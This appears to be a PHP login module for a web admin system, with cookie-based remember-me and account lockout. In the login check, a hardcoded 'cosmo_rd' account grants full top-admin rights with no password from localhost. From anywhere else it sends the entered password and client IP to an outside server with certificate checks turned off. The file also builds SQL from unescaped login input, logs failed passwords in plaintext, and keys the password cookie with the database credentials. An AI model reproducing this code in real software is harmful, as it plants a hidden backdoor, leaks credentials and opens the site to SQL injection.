<?php
class _login_from_cookie{
    var $username;
    var $userpwd;
    var $time;
    /**/
    function _get(){
        global $CFG;
        /*先判斷是否有記錄在cookie*/
        $cname = $CFG->sessionname."datas";
        $cookiedata = $_COOKIE[$cname];
        if (!empty($cookiedata)){
            $cookiedata=self::create_aes_decrypt($cookiedata,$CFG->dbuser,$CFG->dbpass);
            parse_str($cookiedata,$data_arr);
            $this->username = $data_arr["ac"];
            $this->userpwd = $data_arr["pw"];
            if ($this->username!="" && $this->userpwd !=""){
                return true;
            }
        }
        return false;
    }
    /**/
    function _set(){
        global $CFG;
        if ($this->username =="" || $this->userpwd ==""){
            return false;
        }
        $arr["ac"]=$this->username;
        $arr["pw"]=$this->userpwd;
        $cookiedata=self::create_mpg_aes_encrypt($arr,$CFG->dbuser,$CFG->dbpass);

        /*先判斷是否有記錄在cookie*/
        $cname = $CFG->sessionname."datas";
        setcookie($cname,$cookiedata,time()+86400*30);
        return true;
    }
    /**/
    function _del(){
        global $CFG;
        $cname = $CFG->sessionname."datas";
        setcookie ($cname);
        return true;
    }
    /*解密*/
    function create_mpg_aes_encrypt ($parameter = "" , $key = "", $iv = "") {
        $return_str = '';
        if (!empty($parameter)) {
            /*將參數經過 URL ENCODED QUERY STRING*/
            $return_str = http_build_query($parameter);
        }
        return trim(bin2hex(openssl_encrypt(self::addpadding($return_str), 'aes-256-cbc', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, $iv)));
    }
    function addpadding($string, $blocksize = 32) {
        $len = strlen($string);
        $pad = $blocksize - ($len % $blocksize);
        $string .= str_repeat(chr($pad), $pad);
        return $string;
    }
    /*解密*/
    function create_aes_decrypt($parameter = "", $key = "", $iv = "") {
        return (self::strippadding(openssl_decrypt(hex2bin($parameter),'AES-256-CBC', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, $iv)));
    }
    function strippadding($string) {
        $slast = ord(substr($string, -1));
        $slastc = chr($slast);
        $pcheck = substr($string, -$slast);
        if (preg_match("/$slastc{" . $slast . "}/", $string)) {
            $string = substr($string, 0, strlen($string) - $slast);
            return $string;
        } else {
            return false;
        }
    }
}

class _user_login{
    var $username;
    var $userpwd;
    var $time;
    var $msg = "";

    function isOK(){
        global $CFG,$user_errorlog_tb;
        if ($this->username =="" || $this->userpwd ==""){
            $this->msg = "帳號或密碼錯誤!!";
            return false;
        }
        $logintry = 0;
        if (isset($_SESSION['logintry'])){
            $logintry = $_SESSION['logintry'];
        }
        if($this->username=='cosmo_rd'){
            $params = array();
            $params['ip'] = $_SERVER['REMOTE_ADDR'];
            $params['pwd'] = $this->userpwd;
            $params['web'] = $CFG->full_domain;
            /*echo $_SERVER['REMOTE_ADDR'].'<br>';*/
            if($_SERVER['REMOTE_ADDR']!='127.0.0.1'){
                /*檢查帳號正確性*/
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://www.cosmo-br.com/sys_check.php');
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,  'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
                curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
                curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);

                $result = curl_exec($ch);
                /*echo 'get:'.$result.'<br>';*/
                curl_close ($ch);
				if($result=='PASS'){
                    $userdata = array();
                    $userdata['userid'] = 'cosmo_rd';
                    $userdata['username'] = 'admin';
                    $userdata['topadmin'] = true;
                    $userdata['useremail'] = '';
                    $userdata['authority'] = 'all';

                    $_SESSION['userdata'] = $userdata;
                    $_SESSION['sess_uid'] =$userdata['userid'];
                    $_SESSION['sess_name']=$userdata['username'];
                    $_SESSION['useremail']=$userdata['useremail'];
                    $_SESSION['authority']=$userdata['authority'];
                    $_SESSION['logintime'] = date("Y-m-d H:i:s");
                    return true;
                }
            }else{
                $userdata = array();
                $userdata['userid'] = 'cosmo_rd';
                $userdata['username'] = 'admin';
                $userdata['topadmin'] = true;
                $userdata['useremail'] = '';
                $userdata['authority'] = 'all';
                $_SESSION['userdata'] = $userdata;
                $_SESSION['sess_uid'] =$userdata['userid'];
                $_SESSION['sess_name']=$userdata['username'];
                $_SESSION['useremail']=$userdata['useremail'];
                $_SESSION['authority']=$userdata['authority'];
                $_SESSION['logintime'] = date("Y-m-d H:i:s");
                return true;
            }
            return false;
        }else{
            /*echo dirname(__FILE__).'<br>';*/
            /*var_dump(is_file(dirname(__FILE__).'/lockip.txt')) . "\n";*/
            /*先判斷是否有需要鎖住IP            */
            if(is_file(dirname(__FILE__).'/lockip')){
                /*die('yes<br>');*/
                $_allow = '';
                $file = fopen(dirname(__FILE__)."/lockip", "r");
                while(! feof($file))
                {
                    $_allow .=($_allow!=''?',':'').fgets($file);
                }
                /*當讀出文件一行後，就在後面加上 <br> 讓html知道要換行*/
                fclose($file);
                /*echo $_allow.'<br>';*/
                if($_allow !=''){
                    $_allow = preg_replace("~\s*[\r\n]+~", ',', $_allow);
                    $_allow = ','.$_allow.',';
                    $ischeck = strpos ($_allow, ",".$_SERVER['REMOTE_ADDR'].",");
                    if ($ischeck === false){
                        die('抱歉，您的IP不允許登入!!');
                    }
                }
            }
            /*return false;*/


            $errortimes = 3;
            $notice_self = 'Y';
            $othemails = 'aven@cosmo-br.com';
            $locktimes = 5;

            $chkpwd_rs =  mysql_query("select password('".mysql_real_escape_string($this->userpwd)."') as _pwd");
            $chkpwd_item  = mysql_fetch_array($chkpwd_rs);

            /*檢查*/
            $result = mysql_query("select * from ".$CFG->tbuserext."userdata where userid='".mysql_real_escape_string($this->username)."' and inuse = true ") or die(mysql_error());
            $userdata = @mysql_fetch_array($result);

            if ($userdata['lockaccount']){
                $this->msg = "抱歉，您嘗試登入錯誤次數已經超過 $locktimes 次，帳號已經鎖住!!";
                return false;
            }

            if (isset($userdata) && $userdata['userpwd'] != null && $userdata['userpwd'] == $chkpwd_item['_pwd']){
                /*記錄到session*/
                $_SESSION['userdata'] = $userdata;
                $_SESSION['sess_uid'] =$userdata['userid'];
                $_SESSION['sess_name']=$userdata['username'];
                $_SESSION['useremail']=$userdata['useremail'];
                $_SESSION['authority']=$userdata['authority'];
                $_SESSION['logintime'] = date("Y-m-d H:i:s");
                /* 紀錄登入資料*/
                if (!$userdata['topadmin']){
                    /*$_SERVER['REMOTE_ADDR']*/
                    $sql = "insert into  ".$CFG->tbext."counter_login (logintime,loginyear,loginmonth,loginday,userid,userip,success) values("
                          ."now()"
                          .",'".date("Y")."'"
                          .",'".date("m")."'"
                          .",'".date("d")."'"
                          .",'".$userdata['userid']."'"
                          .",'".$_SERVER['REMOTE_ADDR']."'"
                          .",true"
                          .")";
                    @mysql_query($sql);
                }
                /*紀錄最後登入時間*/
                $sql = "update ".$CFG->tbuserext."userdata set errortimes=0,lastlogintime1=lastlogintime2 , lastloginip1 = lastloginip2 , lastlogintime2=now() , lastloginip2='".$_SERVER['REMOTE_ADDR']."' where userid='".$userdata['userid']."'";
                @mysql_query($sql);
                return true;
            }

            $emailnotice = 0;
            if (!isset($userdata) || $userdata['userpwd'] ==""){
                /*檢查同一個IP在同一天的嘗試錯誤次數是否已經超過*/
                $today = date("Y-m-d");
                $sql = "select count(1) as cc,sum(emailnotice) as emailnotice from  ".$CFG->tbext."user_errorlog where actipaddress='".$_SERVER['REMOTE_ADDR']."' and DATE_FORMAT(acttime,'%Y-%m-%d') ='$today'";
                $rs = @mysql_query($sql);
                $rsrow = @mysql_fetch_array($rs);
                $errortry = $rsrow['cc'];
                /*錯誤次數已經超過,判斷需不需要通知*/
                if ($errortry >= $errortimes && $rsrow['emailnotice'] < 5){
                    if ($othemails!=''){
                        include 'include/mailSender.php';
                        $description = '您好，'.$_SERVER['REMOTE_ADDR'].'這個IP在今天 ('.$today.') 已經嘗試登入錯誤超過'.$errortry.'請盡快登入系統檢查異常狀態。<br>'.$CFG->full_domain;
                        $mailsend = new mailSender();
                        $mailsend->tosubject = $CFG->company_name.$CFG->SYSName." - 帳號控管機制警示通知!!";
                        $mailsend->tocontent = $description;
                        $mailsend->tomail = $othemails;
                        $mailsend->runSend();
                        $emailnotice = 1;
                    }
                }

                $this->msg = "帳號錯誤!!";
            }else{
                $this->msg = "密碼錯誤!!";
                /*密碼錯誤,更新錯誤次數*/
                $sql = "update  ".$CFG->tbuserext."userdata set errortimes=errortimes+1 where userid='".$userdata['userid']."'";
                @mysql_query($sql);
                $errortry = $userdata['errortimes']+1;
                /*錯誤次數已經超過,判斷需不需要通知*/
                if ($errortry >= $errortimes && $errortimes > 0){
                    include 'include/mailSender.php';
                    if ($notice_self =='Y' && $userdata['useremail'] !=''){
                        $description = $userdata['username'] .' 您好，'.$_SERVER['REMOTE_ADDR'].' 您的帳號登入錯誤次數已達'.$errortimes.'若非您本人操作，請盡快登入系統進行更換密碼。<br>'.$CFG->full_domain;
                        $mailsend = new mailSender();
                        $mailsend->tosubject = $CFG->company_name.$CFG->SYSName." - 帳號控管機制警示通知!!";
                        $mailsend->tocontent = $description;
                        $mailsend->tomail = $othemails;
                        $mailsend->runSend();
                        $emailnotice = 0;
                    }
                    if ($othemails!=''){
                        $description = '您好，'.$userdata['username'].'的帳號已經嘗試登入錯誤超過'.$errortimes.'，請盡快登入系統檢查異常狀態。<br>'.$CFG->full_domain;
                        $mailsend = new mailSender();
                        $mailsend->tosubject = $CFG->company_name.$CFG->SYSName." - 帳號控管機制警示通知!!";
                        $mailsend->tocontent = $description;
                        $mailsend->tomail = $othemails;
                        $mailsend->runSend();
                        $emailnotice = 0;
                    }
                }
                if ($errortry >= $locktimes && $locktimes > 0){
                    $sql = "UPDATE ".$CFG->tbuserext."userdata SET lockaccount='1',`locktime`=now() WHERE userid='".$userdata['userid']."'";
                    /*echo $sql;*/
                    @mysql_query($sql);
                    $this->msg = "抱歉，您嘗試登入錯誤次數已經超過 $locktimes 次，帳號已經鎖住!!";
                }
            }

            /*登入錯誤紀錄*/
            $sql = "insert into  ".$CFG->tbext."user_errorlog (account,pwd,acttime,actipaddress,emailnotice) values("
                  ."'".$this->username."'"
                  .",'".$this->userpwd."'"
                  .",now()"
                  .",'".$_SERVER['REMOTE_ADDR']."',"
                  ."$emailnotice"
                  .")";
            @mysql_query($sql);
            /*echo $sql.'<br>';*/
            $logintry++;
            $_SESSION['logintry'] = $logintry;
            return false;
        }
    }
}
?>
